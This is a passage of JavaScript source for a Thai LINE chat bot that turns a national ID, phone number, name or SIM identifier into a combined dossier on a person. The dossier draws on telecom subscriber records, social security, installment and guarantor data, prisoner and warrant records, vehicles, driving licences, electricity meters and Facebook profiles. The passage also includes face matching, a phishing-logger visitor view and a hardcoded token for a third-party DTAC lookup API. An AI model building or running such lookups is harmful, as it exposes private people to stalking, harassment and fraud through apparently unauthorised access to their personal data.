    const result = await showPhishingLoggerVisitors(id);
    return reply(event.replyToken, { type: 'text', text: result });
  }

  if (text.startsWith('cell%')) {
    const cellInput = text.replace(/^cell%/i, '').trim();
    try {
      const data = await fetchPEAApi({ cell: cellInput });
      const result = formatKeyValueRows(data, ` Cell Site: ${cellInput}`);
      return reply(event.replyToken, { type: 'text', text: result });
    } catch (err) {
      console.error('cell lookup error:', err?.response?.data || err.message);
      return reply(event.replyToken, { type: 'text', text: '❌ดึงข้อมูล cell site ไม่สำเร็จ: ' + err.message });
    }
  }

  if (text.startsWith('ip%')) {
    const ip = text.replace(/^ip%/, '').trim();
    if (!ip) {
      return reply(event.replyToken, { type: 'text', text: "กรุณาระบุ IP Address\nตัวอย่าง: ip@1.1.1.1" });
    }
    const result = await getIpInfo(ip);
    return reply(event.replyToken, { type: 'text', text: result });
  }

  if (text.startsWith('imei%')) {
    const imei = text.replace(/^imei%/, '').trim();
    if (!imei) {
      return reply(event.replyToken, { type: 'text', text: "❌กรุณาระบุหมายเลข IMEI เช่น imei@123456789012345" });
    }
    const result = await searchIMEI(imei);
    return reply(event.replyToken, { type: 'text', text: result });
  }

  if (text.startsWith('imsi%')) {
    const imsiNumber = text.replace(/^imsi%/, '').trim();
    if (!imsiNumber) {
      return reply(event.replyToken, { type: 'text', text: "❌กรุณาระบุหมายเลข IMSI เช่น imsi@520044020881702" });
    }
    const result = await searchIMSI(imsiNumber);
    return reply(event.replyToken, { type: 'text', text: result });
  }

  if (text.startsWith('icc%')) {
    const iccidNumber = text.replace(/^icc%/, '').trim();
    if (!iccidNumber) {
      return reply(event.replyToken, { type: 'text', text: "❌กรุณาระบุหมายเลข ICCID เช่น icc@89660448216080569814" });
    }
    const result = await searchICCID(iccidNumber);
    return reply(event.replyToken, { type: 'text', text: result });
  }

  if (
  text
    .toLowerCase()
    .startsWith('wf%')
) {

  const citizenId =
    text
      .replace(/^wf%/i, '')
      .trim();


  if (
    !/^\d{13}$/.test(
      citizenId
    )
  ) {

    return reply(
      event.replyToken,
      {
        type: 'text',

        text:
`❌ กรุณาระบุเลขบัตรประชาชน 13 หลัก

ตัวอย่าง
wf@3460300290391`
      }
    );
  }


  try {

    const html =
      await fetchDlaWelfare(
        citizenId
      );


    const result =
      parseDlaWelfare(
        html,
        citizenId
      );


    return reply(
      event.replyToken,
      {
        type: 'text',
        text: result
      }
    );


  } catch (err) {

    console.error(
      'WF DLA ERROR:',
      err?.response?.status,
      err?.message
    );


    return reply(
      event.replyToken,
      {
        type: 'text',

        text:
          '❌ ไม่สามารถตรวจสอบข้อมูลเบี้ยยังชีพได้ กรุณาลองใหม่อีกครั้ง'
      }
    );
  }
}

  if (text.startsWith('kp%')) {
    const id = text.replace(/^kp%/i, '').trim();
    if (!id) {
      return reply(event.replyToken, { type: 'text', text: "❌กรุณาระบุเลขบัตรหรือเลขสมาชิก\nตัวอย่าง: kp@5075018267" });
    }
    try {
      const html = await fetchRtaMemberStatus(id);
      const result = formatRtaMemberStatus(html, id);
      return reply(event.replyToken, { type: 'text', text: result });
    } catch (err) {
      console.error('kp error:', err?.response?.data || err.message);
      return reply(event.replyToken, { type: 'text', text: '❌ตรวจสอบสถานภาพสมาชิกไม่สำเร็จ: ' + err.message });
    }
  }

  if (text.startsWith('cj%')) {
    const payload = text.replace(/^cj%/i, '').trim();
    const parts = payload.split(/\s+/).filter(Boolean);
    const phone = parts[0] || '';
    const idCard = parts[1] || '';
    if (!/^0\d{9}$/.test(phone) || !/^\d{13}$/.test(idCard)) {
      return reply(event.replyToken, { type: 'text', text: "❌รูปแบบไม่ถูกต้อง\nตัวอย่าง: cj@0812345678 1122334455667" });
    }
    try {
      const res = await fetchPEAApiFull({ cj: `${phone}`, [idCard]: '' });
      return reply(event.replyToken, { type: 'text', text: limitLineMessage(res.message || '❌ไม่พบข้อมูล CJ Express') });
    } catch (err) {
      console.error('cj error:', err?.response?.data || err.message);
      return reply(event.replyToken, { type: 'text', text: '❌ดึงข้อมูล CJ Express ไม่สำเร็จ: ' + err.message });
    }
  }

  if (text.startsWith('me%')) {
    const query = text.replace(/^me%/i, '').trim();
    if (!query) {
      return reply(event.replyToken, { type: 'text', text: "❌กรุณาระบุชื่อที่ต้องการค้นหา เช่น me@ยาแก้ไอเด็ก" });
    }
    try {
      const res = await fetchPEAApiFull({ me: query });
      let replyText = '';
      if (res.success && Array.isArray(res.data) && res.data.length > 0) {
        replyText = `=== พบข้อมูลทั้งหมด ${res.data.length} รายการ ===\n`;
        res.data.forEach((item, idx) => {
          replyText += `\n[${idx + 1}]\n`;
          replyText += `ประเภท: ${item.productType || '-'}\n`;
          replyText += `ใบสำคัญ/ใบอนุญาต: ${item.licenseNo || '-'}\n`;
          replyText += `ชื่อผลิตภัณฑ์: ${item.productName || '-'}\n`;
          replyText += `ชื่อผู้รับอนุญาต: ${item.licensee || '-'}\n`;
          replyText += `Newcode: ${item.newcode || '-'}\n`;
          replyText += `สถานะ: ${item.status || '-'}\n`;
          replyText += `────────────`;
        });
      } else {
        replyText = res.message || 'ไม่พบข้อมูลที่ตรงกับคำค้นหา';
      }
      return reply(event.replyToken, { type: 'text', text: limitLineMessage(replyText) });
    } catch (err) {
      console.error('me error:', err?.response?.data || err.message);
      return reply(event.replyToken, { type: 'text', text: '❌ค้นหาข้อมูลยาไม่สำเร็จ: ' + err.message });
    }
  }

  if (text.startsWith('map%')) {
    const coordinates = text.replace(/^map%/, '').trim();
    if (!coordinates) {
      return reply(event.replyToken, { type: 'text', text: "❌กรุณาระบุพิกัด เช่น map@13.7563,100.5018" });
    }
    const result = await createMapLink(coordinates);
    return reply(event.replyToken, { type: 'text', text: result });
  }

  if (text.startsWith('web%')) {
    const url = text.replace(/^web%/, '').trim();
    if (!url) {
      return reply(event.replyToken, { type: 'text', text: "❌กรุณาระบุเว็บไซต์ เช่น web@example.com" });
    }
    const result = await getWebInfo(url);
    return reply(event.replyToken, { type: 'text', text: result });
  }

  if (text.startsWith('lc%')) {
    const keyword = text.replace(/^lc%/i, '').trim();
    if (!keyword) {
      return reply(event.replyToken, { type: 'text', text: "❌ กรุณาระบุชื่อ-สกุล, ชื่อบริษัท/นิติบุคคล เช่น lc@สมชาย ใจดี, บริษัท ตัวอย่าง จำกัด" });
    }
    const result = await searchBOTLicense(keyword);
    return reply(event.replyToken, { type: 'text', text: result });
  }

  if (text.startsWith('loa%')) {
    const appName = text.replace(/^loa%/i, '').trim();
    if (!appName) {
      return reply(event.replyToken, { type: 'text', text: "❌ กรุณาระบุชื่อแอป เช่น loa@ชื่อแอปเงินกู้" });
    }
    const result = await searchLoanLicense(appName);
    return reply(event.replyToken, { type: 'text', text: result });
  }

  if (text.startsWith('for%')) {
    const companyId = text.replace(/^for%/i, '').trim();
    if (!companyId) {
      return reply(event.replyToken, { type: 'text', text: "❌ กรุณาระบุเลขนิติบุคคล เช่น for@0105550000000" });
    }
    const result = await searchCompanyDataforthai(companyId);
    return reply(event.replyToken, { type: 'text', text: limitLineMessage(result) });
  }

  if (text.startsWith('tr%')) {
    const name = text.replace(/^tr%/i, '').trim();
    if (!name) {
      return reply(event.replyToken, { type: 'text', text: "❌ กรุณาระบุชื่อผู้ประกอบการ เช่น tr@บริษัท กาฬสินธุ์ออโตเซลส์ จำกัด" });
    }
    try {
      const result = await searchThaiTruckCenter(name);
      return reply(event.replyToken, { type: 'text', text: limitLineMessage(formatThaiTruckCenterResult(result)) });
    } catch (err) {
      console.error('tr error:', err?.response?.data || err.message);
      return reply(event.replyToken, { type: 'text', text: '❌ เกิดข้อผิดพลาดระหว่างค้นหาผู้ประกอบการขนส่ง' });
    }
  }

  if (text.startsWith('cctv%')) {
  const times = text.replace(/^cctv%/i, '')
    .split(',')
    .map(item => item.trim())
    .filter(Boolean);

  if (times.length !== 2) {
    return reply(event.replyToken, {
      type: 'text',
      text: "❌ กรุณาระบุเวลา เช่น cctv@12:00:00, 12:05:30"
    });
  }

  const diff = calculateCCTVTimeDiff(times[0], times[1]);

  return reply(
    event.replyToken,
    createCCTVFlex(times[0], times[1], diff)
  );
}

  if (text.startsWith('tisi%')) {
    const licenseId = text.replace(/^tisi%/i, '').trim();
    if (!licenseId) {
      return reply(event.replyToken, { type: 'text', text: "❌ กรุณาระบุเลข มอก. เช่น tisi@1234" });
    }
    const result = await searchTISI(licenseId);
    return reply(event.replyToken, { type: 'text', text: limitLineMessage(result) });
  }

  if (text.startsWith('psi#')) {
    const input = text.replace(/^psi#/, '').trim();
    if (!input) {
      return reply(event.replyToken, { type: 'text', text: "❌กรุณาระบุเลขบัตรประชาชน เช่น psi@1234567890123" });
    }
    try {
      const data = await fetchPrisonerApi({ psi: input }, SECURE_SEARCH_API_BASE);
      const result = formatPrisonerRecordsFlex(data, input, false);
return reply(event.replyToken, result);
    } catch (err) {
  console.error('psi error:', err?.response?.data || err.message);

  return reply(event.replyToken, {
    type: 'text',
    text: '❌ ไม่พบข้อมูล สืบค้นใหม่อีกครั้ง'
  });
}
  }

  if (text.startsWith('ps#')) {
    const input = text.replace(/^ps#/, '').trim();
    if (!input) {
      return reply(event.replyToken, { type: 'text', text: "❌กรุณาระบุเลขบัตรประชาชน เช่น ps@1234567890123" });
    }
    try {
      const data = await fetchPrisonerApi({ ps: input }, SECURE_SEARCH_API_BASE);
      const result = formatPrisonerRecordsFlex(data, input, true);
return reply(event.replyToken, result);
    } catch (err) {
  console.error('psi error:', err?.response?.data || err.message);

  return reply(event.replyToken, {
    type: 'text',
    text: '❌ ไม่พบข้อมูล สืบค้นใหม่อีกครั้ง'
  });
}
  }

  if (text.startsWith('peab%')) {
    const parts = text.replace(/^peab%/, '').trim().split(/\s+/);
    const ca = parts[0];
    const peano = parts[1];
    if (!ca || !peano) {
      return reply(event.replyToken, { type: 'text', text: "❌กรุณาระบุข้อมูลให้ครบ เช่น peab@020006438778 6300096416" });
    }
    try {
      const data = await fetchPEAApi({ peab: ca, peano });
      const result = formatPEABillHistory(data, ca, peano);
      return reply(event.replyToken, { type: 'text', text: result });
    } catch (err) {
      console.error('peab error:', err?.response?.data || err.message);
      return reply(event.replyToken, { type: 'text', text: '❌ดึงข้อมูลประวัติค่าไฟ PEA ไม่สำเร็จ: ' + err.message });
    }
  }

  if (text.startsWith('peac%')) {
    const parts = text.replace(/^peac%/, '').trim().split(/\s+/);
    const ca = parts[0];
    const page = parts[1] ? parseInt(parts[1], 10) - 1 : 0;
    if (!ca) {
      return reply(event.replyToken, { type: 'text', text: "❌กรุณาระบุเลข CA เช่น peac@020006438778" });
    }
    try {
      const data = await fetchPEAApi({ peac: ca });

      return reply(
        event.replyToken,
        buildPEANFlex(data, " ข้อมูลมิเตอร์ไฟฟ้า PEA", page)
      );
    } catch (err) {
      console.error('peac error:', err?.response?.data || err.message);
      return reply(event.replyToken, { type: 'text', text: '❌ดึงข้อมูล PEA จากเลข CA ไม่สำเร็จ: ' + err.message });
    }
  }

  if (text.startsWith('pean%') || text.startsWith('pean#')) {
    const input = text.replace(/^pean[%#]/, '').trim();
    const parts = input.split(/\s+/);
    let page = 0;
    if (parts.length > 2 && /^\d+$/.test(parts[parts.length - 1])) {
      page = parseInt(parts.pop(), 10) - 1;
    }
    const name = parts.join(' ');
    if (!name) {
      return reply(event.replyToken, { type: 'text', text: "❌กรุณาใส่ชื่อเต็มและนามสกุล เช่น pean@เย็น เก่งสาริกิจ" });
    }
    try {
      const data = await fetchPEAApi({ pean: name });

      return reply(
        event.replyToken,
        buildPEANFlex(data, " ข้อมูลมิเตอร์ไฟฟ้าตามชื่อ", page, name)
      );
    } catch (err) {
      console.error('pean error:', err?.response?.data || err.message);
      return reply(event.replyToken, { type: 'text', text: '❌ดึงข้อมูล PEA จากชื่อไม่สำเร็จ: ' + err.message });
    }
  }

  if (text.startsWith('peau%')) {
    const input = text.replace(/^peau%/, '').trim();
    const parts = input.split(/\s+/);

    let page = 0;
    if (parts.length > 1 && /^\d+$/.test(parts[parts.length - 1])) {
      page = parseInt(parts.pop(), 10) - 1;
    }

    const address = parts.join(' ');

    if (!address) {
      return reply(event.replyToken, {
        type: 'text',
        text: "❌ กรุณาระบุที่อยู่ เช่น peau@นครสวรรค์"
      });
    }

    try {
      // ✅ ต้องมีบรรทัดนี้
      const data = await fetchPEAApi({ peau: address });

      // ✅ แล้วค่อยใช้
      return reply(
        event.replyToken,
        buildPEAUFlex(data, page)
      );

    } catch (err) {
      console.error('peau error:', err?.response?.data || err.message);
      return reply(event.replyToken, {
        type: 'text',
        text: '❌ ดึงข้อมูล PEA จากที่อยู่ไม่สำเร็จ'
      });
    }
  }

  // 🔎 รวมผลจากคำสั่งย่อยทั้งหมด: all%เลขบัตร
  if (text.startsWith('all%')) {
    const pid = text.replace(/^all%/i, '').trim();
    if (!/^\d{13}$/.test(pid)) {
      return reply(event.replyToken, {
        type: 'text',
        text: "❌ กรุณาระบุเลขบัตรประชาชน 13 หลัก เช่น all@1401000124449"
      });
    }

    const run = (label, promise) => Promise.resolve(promise).then(data => ({ label, ok: true, data })).catch(error => {
      console.error(`all% ${label} error:`, error?.response?.data || error.message);
      return { label, ok: false, data: null };
    });
    const fetchAllDtac = async () => {
      let lastError;
      for (let attempt = 0; attempt < 3; attempt += 1) {
        try {
          const response = await axios.get(
            `https://dtac-api.jedi-r3cloud.org/dtac?phone=${encodeURIComponent(pid)}&token=jedi-api-2026`,
            { timeout: 45000 }
          );
          return response.data;
        } catch (error) {
          lastError = error;
          if (error?.response?.status !== 429 || attempt === 2) break;
          const retryAfter = Number.parseFloat(error.response.data?.message?.match(/[\d.]+/)?.[0] || 3);
          await new Promise(resolve => setTimeout(resolve, Math.min(retryAfter * 1000, 20000)));
        }
      }
      throw lastError;
    };

    const [dtac, fiber, sso, installment, prisoner, warrant, crime, vehicle, license] = await Promise.all([
      run('DTAC', fetchAllDtac()),
      run('TRUE', fetchISMApi(pid)),
      run('ประกันสังคม', fetchSearchApiRaw({ si: pid }, SECURE_SEARCH_API_BASE)),
      run('ประวัติผ่อนสินค้า', fetchSiamInstallment(pid)),
      run('ผู้ต้องขัง', fetchPrisonerApi({ psi: pid }, SECURE_SEARCH_API_BASE)),
      run('หมายจับศาล', fetchSearchApiRaw({ doc: pid }, SECURE_SEARCH_API_BASE)),
      run('หมายจับ CRIME', fetchCrime(pid)),
      run('ครอบครองรถ', fetchSearchApiRaw({ cid: pid }, SECURE_SEARCH_API_BASE)),
      run('ใบขับขี่', fetchSearchApiRaw({ dl: pid }, SECURE_SEARCH_API_BASE))
    ]);

    const section = (title, body) => `
────────────
${title}\n${body || '❌ ไม่พบข้อมูล'}`;
    const rows = value => Array.isArray(value) ? value : [];
    const firstOrLast = value => rows(value?.content || value?.data || value).slice(-1)[0];
    const val = (item, ...keys) => {
      for (const key of keys) {
        if (item?.[key] !== undefined && item?.[key] !== null && String(item[key]).trim()) return String(item[key]).trim();
      }
      return '-';
    };
    const countText = value => {
      const list = rows(value?.content || value?.data || value);
      return list.length ? `✅ พบข้อมูล **${list.length} รายการ**` : '❌ ไม่พบข้อมูล';
    };

    let msg = ` **PID : ${pid}**`;
    const dtacRows = rows(dtac.data);
    let dtacText = countText(dtac.data);
    if (dtacRows.length) {
      const name = val(dtacRows[0], 'name', 'fullname');
      dtacText += `\n**ชื่อ:** ${name}\n`;
      dtacRows.forEach((item, index) => {
        dtacText += `${index + 1}️⃣ **${val(item, 'phone', 'mobile')}** — ✅ ${val(item, 'status', 'statusDesc') === '-' ? 'Active' : val(item, 'status', 'statusDesc')}\n`;
      });
    }
    msg += section("DTAC", dtac.ok ? dtacText : null);

    const online = fiber.data?.onlineApi?.response?.data?.collection?.online;
    const onlineRows = Array.isArray(online?.collectionList) ? online.collectionList : [];
    let fiberText = onlineRows.length ? '' : '❌ ไม่พบข้อมูล';
    if (onlineRows.length) {
      fiberText = onlineRows.map(item => {
        const address = item.address || {};
        const addressText = typeof address === 'string'
          ? address
          : [address.line1, address.line2].filter(Boolean).join('\n');
        return `• BAN:** ${val(item, 'ban')}
• บริการ:** ${val(item, 'mobileNo')}
• สถานะ:** ${val(item, 'statusDesc', 'status')}\n**ที่อยู่ติดตั้ง**\n${addressText || '-'}`;
      }).join('\n\n');
    }
    msg += section("TRUE FIBER", fiber.ok ? fiberText : null);

    const siData = sso.data?.data || sso.data;
    const siRows = rows(siData?.content || siData?.data || siData);
    const siLast = siRows[0];
    let siText = countText(siData);
    if (siLast) {
      siText += `

**รายการล่าสุด**
• บริษัท:** ${val(siLast, 'companyName', 'company', 'name')}
◇ รหัสประจำสาขา
  ** ${val(siLast, 'accBran', 'branchCode')}
• สถานะ:** ${val(siLast, 'employStatusDesc', 'status')}`;
    }
    msg += section("ประกันสังคม", sso.ok ? `${siText}\n\n> แสดงเฉพาะรายการล่าสุด` : null);

    const history = installment.data?.data?.installment_history || [];
    const latestInstallment = history[0];
    let installmentText = history.length ? `✅ พบข้อมูล **${history.length} รายการ**` : '❌ ไม่พบข้อมูล';
    if (latestInstallment) {
      const guarantor = latestInstallment.guarantor || {};
      installmentText += `

**รายการล่าสุด**
◇ หมายเลขโทรศัพท์
  ** ${val(latestInstallment, 'phone')}
◇ หมายเลขโทรศัพท์เพิ่มเติม
  ** ${val(latestInstallment, 'other_phone')}
• วันที่เริ่มสัญญา:** ${val(latestInstallment, 'contract_start_date')}\n\n**ที่อยู่ลงสินค้า**\n${val(latestInstallment, 'current_address')}

ผู้ค้ำ
◇ ชื่อที่ระบุ
  ** ${val(guarantor, 'name')}
◇ หมายเลขบัตร
  ** ${val(guarantor, 'id')}
◇ หมายเลขโทรศัพท์
  ** ${val(guarantor, 'phone')}
• ความสัมพันธ์:** ${val(guarantor, 'relationship')}\n\n> แสดงเฉพาะรายการล่าสุด`;
    }
    msg += section("ประวัติผ่อนสินค้า", installment.ok ? installmentText : null);

    const warrantRows = rows(warrant.data?.data?.content || warrant.data?.data || warrant.data?.content || warrant.data);
    const warrantText = warrantRows.length
      ? `${countText(warrantRows)}\n\n${warrantRows.map((item, index) => `${index + 1}️⃣ หมายเลข ${val(item, 'woaNo')}/${val(item, 'woaYear')}
• ศาล:** ${val(item, 'courtCodeText', 'courtName')}
• สถานะ:** ${val(item, 'arrestStatus')}
◇ รายการข้อหา
  ** ${val(item, 'charge')}
• วันที่ออกหมาย:** ${val(item, 'woaDate')}
• สิ้นสุด:** ${val(item, 'woaEndDate')}`).join('\n\n')}`
      : null;
    msg += section("ข้อมูลผู้ต้องขัง", prisoner.ok ? formatPrisonerRecords(prisoner.data, pid, false) : null);
    msg += section("หมายจับศาล", warrant.ok ? warrantText : null);
    msg += section("หมายจับ CRIME", crime.ok ? formatCrime(crime.data, pid) : null);
    const vehicleRows = rows(vehicle.data?.data?.content || vehicle.data?.data || vehicle.data?.content || vehicle.data);
    const vehicleText = vehicleRows.length
      ? `✅ พบข้อมูล **${vehicleRows.length} รายการ**\n\n${vehicleRows.slice(0, 2).map((car, index) => `${index + 1}️⃣ ทะเบียน ${val(car, 'plate1')}${val(car, 'plate2')}
◇ สำนักงานที่ระบุ
  ** ${val(car, 'offLocDesc')}
◇ ยี่ห้อที่ระบุ
  ** ${val(car, 'brnDesc')}
◇ รุ่นที่ระบุ
  ** ${val(car, 'modelName')}
◇ วันจดทะเบียน
  ** ${val(car, 'regDate')}
• วันหมดอายุ:** ${val(car, 'expDate')}
• ผู้ถือกรรมสิทธิ์:** ${val(car, 'owner1')}
• ผู้ครอบครอง:** ${val(car, 'owner2')}`).join('\n\n')}`
      : null;
      msg += section(
  "ฌาปนกิจสงเคราะห์",
  '❌ ไม่พบข้อมูล'
);

msg += section(
  "กรรมการบริษัท",
  '❌ ไม่พบข้อมูล'
);

msg += section(
  "BUS",
  '❌ ไม่พบข้อมูล'
);

msg += section(
  "กรมเจ้าท่า",
  '❌ ไม่พบข้อมูล'
);

msg += section(
  "Railway",
  '❌ ไม่พบข้อมูล'
);
    msg += section("ครอบครองรถ", vehicle.ok ? vehicleText : null);
    const licenseRows = rows(license.data?.data?.content || license.data?.data || license.data?.content || license.data);
    const dateOnly = value => {
      const match = String(value || '').match(/^(\d{4})-(\d{2})-(\d{2})/);
      return match ? `${match[3]}/${match[2]}/${match[1]}` : '-';
    };
    const licenseText = licenseRows.length
      ? `✅ พบข้อมูล **${licenseRows.length} รายการ**\n\n${licenseRows.map((item, index) => `${index + 1}️⃣ ${val(item, 'type')}\n* เลขที่ใบอนุญาต: ${val(item, 'licenseNumber')}\n* สถานะ: ${val(item, 'status')}\n* สาขา: ${val(item, 'officeBranch')}\n* รหัสสาขา: ${val(item, 'officeBranchCode')}\n* วันที่ออก: ${dateOnly(item.licenseIssueDate)}\n* วันหมดอายุ: ${dateOnly(item.licenseExpirationDate)}`).join('\n\n')}`
      : null;
    msg += section("ใบอนุญาตขับขี่", license.ok ? licenseText : null);
    msg += "\n────────────\n **หากต้องการข้อมูลโดยละเอียด กรุณาสืบค้นแยกตามคำสั่ง**";

    return reply(event.replyToken, { type: 'text', text: limitLineMessage(msg) });
  }

  // 🔎 รวมข้อมูลจากเลขบัตร
  if (/^all%\d{13}$/.test(text)) {
    const pid = text.replace(/^all%/, '').trim();

    try {

const [hRes, cRes, siRes, sRes, dRes, dlRes, cidRes] =
await Promise.allSettled([

searchJediHp(pid),
fetchCrime(pid),
fetchPEAApi({ si: pid }, SECURE_SEARCH_API_BASE),
fetchInstallment(pid),

axios.get(
`https://dtac-api.jedi-r3cloud.org/dtac?phone=${encodeURIComponent(pid)}&token=jedi-api-2026`,
{ timeout:45000 }
),

fetchSearchApiRaw({ dl: pid }, SECURE_SEARCH_API_BASE),
fetchSearchApiRaw({ cid: pid }, SECURE_SEARCH_API_BASE)

]);
      const dData = dRes.status === 'fulfilled' ? dRes.value.data : null;
      const bqRes = await fetchBQuikForAll(pid, dData);

      let msg = `[PID]
:${pid}
────────────
`;

// =======================
// 📂DTAC INFO
// =======================

try {
  if (dData) {
    msg += `DTAC
`;
    const dtacText = formatDtacSearch(dData, pid)
      .replace(new RegExp(`เลขบัตร:\\s*${pid.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`), `เลขบัตร: *********${String(pid).slice(-4)}`);
    msg += dtacText;
  }

} catch (e) {
  console.log('all% dtac error:', e.message);
}

msg += `
────────────
AIS
`;
msg += `❌ ไม่พบข้อมูล`;

msg += `
────────────
TRUE
`;
msg += `❌ ไม่พบข้อมูล`;

msg += `
────────────`;

      msg += `
ข้อมูลบุคคล/สิทธิรักษา
`;
      msg += hRes.status === 'fulfilled'
        ? limitAllSection(hRes.value, 900)
        : '❌ไม่พบข้อมูลสิทธิ';

      msg += `

────────────
หมายจับ[CRIME]
`;
      msg += cRes.status === 'fulfilled'
        ? limitAllSection(formatCrime(cRes.value, pid), 900)
        : '❌ไม่พบข้อมูลหมายจับ[CRIME]';

msg += `

────────────
`;

msg += dlRes.status==='fulfilled'
? summarizeDL(dlRes.value?.data)
: '❌ไม่พบข้อมูลใบขับขี่';

msg += `

────────────
`;

msg += cidRes.status==='fulfilled'
? summarizeVehicleCID(cidRes.value)
: '❌ไม่พบข้อมูลทะเบียนรถ';

      msg += `

────────────
ประกันสังคม
`;
      msg += siRes.status === 'fulfilled'
        ? summarizeSI(siRes.value)
        : '❌ไม่พบข้อมูลประกันสังคม';

msg += `

────────────
Railway
`;
msg += `❌ ไม่พบข้อมูล`;

msg += `
────────────
Bus
`;
msg += `❌ ไม่พบข้อมูล`;

msg += `
────────────
กรมเจ้าท่า
`;
msg += `❌ ไม่พบข้อมูล`;

msg += `
────────────
กรรมการบริษัท
`;
msg += `❌ ไม่พบข้อมูล`;

      msg += `

────────────
ศูนย์บริการรถ
`;
      msg += bqRes
        ? formatBQuikServiceCenter(bqRes)
        : '❌ไม่พบข้อมูลศูนย์บริการรถ';

      msg += "\n\n────────────\nผ่อนเครื่องใช้ไฟฟ้า\n";
msg += sRes.status === 'fulfilled'
? limitAllSection(formatInstallment(sRes.value),1200)
: '❌ไม่พบข้อมูลผ่อนสินค้า';

msg += `
────────────
⚠️คำเตือน
• บางรายการมีจำนวนมากจึงแสดงได้บางส่วน
• หากต้องการละเอียด ให้เช็คแยกคำสั่ง
`;

return reply(event.replyToken,{
type:'text',
text:limitLineMessage(msg)
});

    } catch (err) {
      console.error('all lookup error:', err?.response?.data || err.message);
      return reply(event.replyToken, {
        type: 'text',
        text: '❌ ดึงข้อมูลรวมไม่สำเร็จ'
      });
    }
  }

  return;
}

async function getFacebookProfile(profileId) {
  const response = await axios.get(
    'https://serpapi.com/search.json',
    {
      params: {
        engine: 'facebook_profile',
        profile_id: profileId,
        api_key: process.env.SERPAPI_KEY
      }
    }
  );

  return response.data.profile_results;
}

function formatFacebookProfile(data) {
  return `
 ▸ รายละเอียดโปรไฟล์ Facebook

◇ ชื่อที่ระบุ
  ${data.name || '-'}
 Facebook ID: ${data.id || '-'}
 ประเภท: ${data.profile_type || '-'}
 หมวดหมู่: ${data.category || '-'}

 Followers: ${data.followers || '-'}
 Following: ${data.following || '-'}

 โทรศัพท์: ${data.phone || '-'}
 Email: ${data.email || '-'}

 URL:
${data.url || '-'}

 เกี่ยวกับ:
${data.profile_intro_text || '-'}
`;
}

function buildFacebookProfileFlex(data) {
    data = data || {};
  return {
    type: 'bubble',
    size: 'mega',
    hero: {
      type: 'image',
      url: data.cover_photo || data.profile_picture || 'https://via.placeholder.com/1024x512.png?text=Facebook+Profile',
      size: 'full',
      aspectRatio: '20:9',
      aspectMode: 'cover'
    },
    body: {
      type: 'box',
      layout: 'vertical',
      spacing: 'md',
      contents: [
        {
          type: 'box',
          layout: 'horizontal',
          spacing: 'md',
          contents: [
            {
              type: 'image',
              url: data.profile_picture || 'https://via.placeholder.com/300.png?text=Profile',
              size: 'md',
              aspectRatio: '1:1',
              aspectMode: 'cover',
              flex: 0
            },
            {
              type: 'box',
              layout: 'vertical',
              contents: [
                {
                  type: 'text',
                  text: data.name || '-',
                  weight: 'bold',
                  size: 'lg',
                  wrap: true
                },
                {
                  type: 'text',
                  text: `ID: ${data.id || '-'}`,
                  size: 'xs',
                  color: '#64748B',
                  wrap: true
                },
                {
                  type: 'text',
                  text: data.profile_type || '-',
                  size: 'xs',
                  color: '#2563EB',
                  weight: 'bold'
                }
              ]
            }
          ]
        },
        {
          type: 'separator',
          margin: 'md'
        },
        {
          type: 'text',
          text: ` Followers: ${data.followers || '-'}`,
          size: 'sm'
        },
        {
          type: 'text',
          text: ` Following: ${data.following || '-'}`,
          size: 'sm'
        },
        {
          type: 'text',
          text: ` หมวดหมู่: ${data.category || '-'}`,
          size: 'sm',
          wrap: true
        },
        {
          type: 'text',
          text: ` ${data.profile_intro_text || '-'}`,
          size: 'sm',
          wrap: true,
          color: '#334155'
        }
      ]
    },
    footer: {
      type: 'box',
      layout: 'vertical',
      contents: [
        {
          type: 'button',
          style: 'primary',
          color: '#1877F2',
          action: {
            type: 'uri',
            label: 'เปิดโปรไฟล์ Facebook',
            uri: data.url || 'https://www.facebook.com'
          }
        }
      ]
    }
  };
}

async function compareFace(file1, file2) {
  const form = new FormData();

  form.append('file1', fs.createReadStream(file1));
  form.append('file2', fs.createReadStream(file2));

  const { data } = await axios.post(
    'https://api.iapp.co.th/v3/store/ekyc/face-verification',
    form,
    {
      headers: {
        apikey: IAPP_API_KEY,
        ...form.getHeaders()
      },
      timeout: 60000
    }
  );

  return data;
}

function formatFaceCompare(data){

  let score =
      data.similarity_score ??
      data.comparison_score ??
      data.score ??
      0;

  // ถ้าเป็น 0.69 ค่อยแปลงเป็น 69
  if(score <= 1){
     score = score * 100;
  }

  score = Math.round(score);

  const same = score >= 50;

  return ` เปรียบเทียบใบหน้า
• ผลลัพธ์: ${
same
? '✅ บุคคลเดียวกัน'
: '❌ คนละบุคคล'
}
◇ คะแนนความคล้ายของใบหน้า
  ${score}%
• สถานะ: ${data.message || '-'}

────────────
⚠️ใช้ประกอบการวิเคราะห์
การสืบสวนเท่านั้น !!`;
}

async function readPlateOcr(
  imagePath,
  originalName = 'plate.jpg',
  mimeType = 'image/jpeg'
) {

  const formData =
    new FormData();


  formData.append(
    'file',
    fs.createReadStream(
      imagePath
    ),
    {
      filename:
        originalName ||
        'plate.jpg',

      contentType:
        mimeType ||
        'image/jpeg'
    }
  );


  const response =
    await axios.post(
      'https://api.iapp.co.th/license-plate-recognition/file',

      formData,

      {
        headers: {
          apikey:
            IAPP_API_KEY,

          ...formData.getHeaders()
        },

        timeout:
          60000,

        maxContentLength:
          Infinity,

        maxBodyLength:
          Infinity
      }
    );


  return response.data;
}

function formatPlateOcr(data) {
  return ` ▸ สรุปการอ่านป้ายทะเบียน
• ป้ายทะเบียน: ${data.lp_number || '-'}
◇ จังหวัดที่ระบุ
  ${data.province || '-'}
• ประเทศ: ${data.country || '-'}
◇ ค่าความมั่นใจ
  ${data.conf || '-'}%
• พบยานพาหนะ: ${data.is_vehicle || '-'}
• ป้ายหาย/ไม่ชัด: ${data.is_missing_plate || '-'}
◇ ยี่ห้อที่ระบุ
  ${data.vehicle_brand || '-'}
◇ รุ่นที่ระบุ
  ${data.vehicle_model || '-'}
◇ สีที่ระบุ
  ${data.vehicle_color || '-'}
◇ ประเภทของรถ
  ${data.vehicle_body_type || '-'}
• ปีรถ: ${data.vehicle_year || '-'}
• สถานะ: ${data.message || '-'}

────────────
⚠️ใช้ประกอบการวิเคราะห์
การสืบสวนเท่านั้น !!`;
}

async function handleImage(event) {
  const userId = event.source.userId;
  const db = loadDB();
  const member = db.members[userId];
  const topup = db.topups?.[userId];

  // รับภาพหลักฐานของคำสั่ง base%
  if (baseRequestSessions[userId]?.step === 'waiting_evidence') {
    const session = baseRequestSessions[userId];

    try {
      const profile = await getProfile(userId);
